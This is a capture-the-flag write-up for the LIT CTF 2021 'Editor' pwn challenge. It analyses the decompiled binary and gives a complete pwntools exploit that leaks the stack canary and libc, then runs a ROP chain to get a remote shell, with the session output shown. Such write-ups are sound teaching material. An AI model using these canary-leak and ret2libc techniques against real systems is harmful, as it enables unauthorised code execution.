# Lexington Informatics Tournament CTF 2021

## pwn/Editor

> Rythm 
> 
> I built a very helpful string editor. I hope it doesn’t have any mistakes. 
> 
> `nc editor.litctf.live 1337`
>
> [editor_pwn.zip](editor_pwn.zip)

Tags: _pwn_ _x86-64_ _bof_ _rop_ _write-what-where_


## Summary

Basic BOF/ROPchain exploit leveraging a painful builtin _write what where_ editor.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

All mitigations in place except PIE, so ROP it is.  We'll need to leak that canary however to get the BOF.


### Decompile with Ghidra 
```c
undefined8 main(void)
{
  int iVar1;
  long in_FS_OFFSET;
  char local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Welcome to the string editor!\n");
  if (initialized == 0) {
    puts("Please input your initial string (don\'t worry, we do not use gets):");
    read(0,local_98,0xb0);
    initialized = 1;
  }
  else {
    puts("Um... that\'s strange.");
  }
  puts("");
  puts("Great! Now, you can begin editing your string!\n");
  while( true ) {
    while( true ) {
      iVar1 = menu();
      if (iVar1 != 1) break;
      strcpy(editbuf,local_98);
      edit();
      strcpy(local_98,editbuf);
    }
    if (iVar1 != 2) break;
    puts("Great! Here\'s your string:");
    puts(local_98);
  }
  puts("Great! Hope you accomplished what you wanted!");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}
```

Starting from the top there's a check (global `initialized`) to prevent _second-passers_ from reusing `read`.  Worth remembering that.

The `read(0,local_98,0xb0)` is the first vulnerability.  `local_98` is `0x98` bytes from the return address, however `read` will accept `0xb0` bytes allowing for a 24-byte ROP chain.  This kinda spells out the attack: `pop rdi /bin/sh; call system`.

Then there's this loop:

```
Your options are:
1) Edit Position
2) Display string
3) Exit program
```

Clearly we use `Display string` for read and `Edit Position` for writes.

The edit is an annoying oddball, first it copies the buffer to a global (`editbuf`), then `edit` (see below) prompts for a single char position and value, then copies it back.  Both copies use `strcpy` that will copy until it hits a null and will terminate the copy with a null as well.  This is our vulnerability, but also our pain in the ass.

```c
void edit(void)
{
  int local_c;
  
  puts("Great! Please input the index you\'d like to change!");
  __isoc99_scanf(&%d,&local_c);
  getchar();
  puts("Nice!, Now select the character you\'d like to change it to!");
  __isoc99_scanf(&%c,editbuf + local_c);
  puts("");
  return;
}
```

`edit` is really a _write what where_ that can write forward or _backwards_, however the (implied _signed_) `int` it limited to 2**31 bytes in either direction; on a 64-bit machine with ASLR we will be unable to mess with the stack or libc.  And with Full RELRO in place, a simple GOT overwrite is not an option.

We're going to need a canary and libc leak, after that we can write out a ROP chain.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./editor')

if args.REMOTE:
    p = remote('editor.litctf.live', 1337)
    libc = ELF('./libc-2.31.so')
    libc_start_main_offset = 234
else:
    p = process(binary.path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc_start_main_offset = 243
    libc.symbols['gadget'] = [0xe6c7e,0xe6c81,0xe6c84][1]
```

Standard pwntools header, however a ROP chain didn't work for me locally (_one\_gadget_ did), however _one\_gadget_ did not work remotely, only a ROP chain.  Locally I was getting a stack alignment issue.  Testing _one\_gadget_ was quick enough to get the PoC done.  I did have other options to make it work locally with a ROP chain, e.g. jumping to `main` or `main+1` vs. `_start` or sucking it up and messing with that horrible buildit editor to get one more line out.  But why waste the time?  I got the flag already.

```python
## round 1 leak canary
# leak canary
p.sendafter(':\n',(0x98-0x10+1) * b'A')
p.sendlineafter('?\n','2')
p.recvline()
p.recvline()
p.recv(0x98-0x10+1)
canary = u64(b'\0' + p.recv(7))
log.info('canary: ' + hex(canary))

# reset intialized
p.sendlineafter('?\n','1')
p.sendlineafter('!\n',str(binary.sym.initialized - binary.sym.editbuf))
p.sendlineafter('!\n',b'\0')

# write out RBP and return address
for i in range(8 + 6):
    p.sendlineafter('?\n','1')
    p.sendlineafter('!\n',str(0x98-0x8+i))
    p.sendlineafter('!\n',b'B')

# zero out return address
# have to do this backwards because of how edit/strcpy
for i in range(5,2,-1):
    p.sendlineafter('?\n','1')
    p.sendlineafter('!\n',str(0x98+i))
    p.sendlineafter('!\n',b'\0')

# set return address to _start
for i in range(3):
    p.sendlineafter('?\n','1')
    p.sendlineafter('!\n',str(0x98+i))
    payload = p8(p64(binary.sym._start)[i])
    p.sendlineafter('!\n',payload)

# patch canary
p.sendlineafter('?\n','1')
p.sendlineafter('!\n',str(0x98-0x10))
p.sendlineafter('!\n',b'\0')

# exit to jump back to _start
p.sendlineafter('?\n','3')
```

There's a lot to unpack here in round one.

The `read` buffer `local_98` is `98 - 10` from `local_10` (the canary).  Canaries have their LSB always set to `00`.  That null will make the aforementioned `strcpy` based editor impossible to use, plus it will also terminate the string when displaying, so we'll have to add one to our write to replace the `00` with an `A`.  Then we can simply display the string to get the canary.

After that we need to reset `initialized` using the editor and going _backwards_.

Next, write out a new return address and set it to `_start`, to start all over.  This is a bit tricky with this editor, you kinda have to do it from the end and work back.

> Some clarity here.  The original return address was 48-bits, and the `_start` address is 24-bits, the working from backwards was to null out the address.

Lastly we can patch the canary and restore the `00` at the end, this has to be done last or we would have been unable to do the rest because of the `strcpy`-based editor.

```python
## round 2: leak libc
# leak libc
payload  = b''
payload += (0x98-0x10) * b'A'
payload += p64(canary + 1)
payload += (0x98 - len(payload)) * b'B'
p.sendafter(':\n',payload)
p.sendlineafter('?\n','2')
p.recvline()
p.recvline()
p.recv(0x98)
__libc_start_main = u64(p.recv(6) + b'\0\0')
libc.address = __libc_start_main - libc_start_main_offset - libc.sym.__libc_start_main
log.info('libc.address: ' + hex(libc.address))

# reset intialized
p.sendlineafter('?\n','1')
p.sendlineafter('!\n',str(binary.sym.initialized - binary.sym.editbuf))
p.sendlineafter('!\n',b'\0')

# write out RBP and return address
for i in range(8 + 6):
    p.sendlineafter('?\n','1')
    p.sendlineafter('!\n',str(0x98-0x8+i))
    p.sendlineafter('!\n',b'B')

# zero out return address
# have to do this backwards because of how edit/strcpy
for i in range(5,2,-1):
    p.sendlineafter('?\n','1')
    p.sendlineafter('!\n',str(0x98+i))
    p.sendlineafter('!\n',b'\0')

# set return address to _start
for i in range(3):
    p.sendlineafter('?\n','1')
    p.sendlineafter('!\n',str(0x98+i))
    payload = p8(p64(binary.sym._start)[i])
    p.sendlineafter('!\n',payload)

# patch canary
p.sendlineafter('?\n','1')
p.sendlineafter('!\n',str(0x98-0x10))
p.sendlineafter('!\n',b'\0')

# exit to jump back to _start
p.sendlineafter('?\n','3')
```

This is not unlike the first round.  However this time we're leaking the return address `__libc_start_main` so we can compute the location of libc.

This leak was discovered using GDB.

Like before we patch the canary last and jump back to `_start`.


```python
## round 3: rop chain
payload  = b''
payload += (0x98-0x10) * b'A'
payload += p64(canary)
payload += (0x98 - len(payload)) * b'B'
if args.REMOTE:
    pop_rdi = next(binary.search(asm('pop rdi; ret')))
    payload += p64(pop_rdi)
    payload += p64(libc.search(b'/bin/sh').__next__())
    payload += p64(libc.sym.system)
else:
    payload += p64(libc.sym.gadget)

p.sendafter(':\n',payload)

# exit to shell
p.sendlineafter('?\n','3')
p.interactive()
```

The final round.  We can simply use the 24-byte stack smash provided by `read` to write out ROP chain to get a shell.


Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/litctf2021/editor_pwn/editor'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to editor.litctf.live on port 1337: Done
[*] '/pwd/datajerk/litctf2021/editor_pwn/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] canary: 0x39eebed1c541ae00
[*] libc.address: 0x7f9655278000
[*] Switching to interactive mode

Great! Hope you accomplished what you wanted!
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cat flag.txt
flag{y3t_4n0th3r_b0r1ng_r3t2l1bc}
```
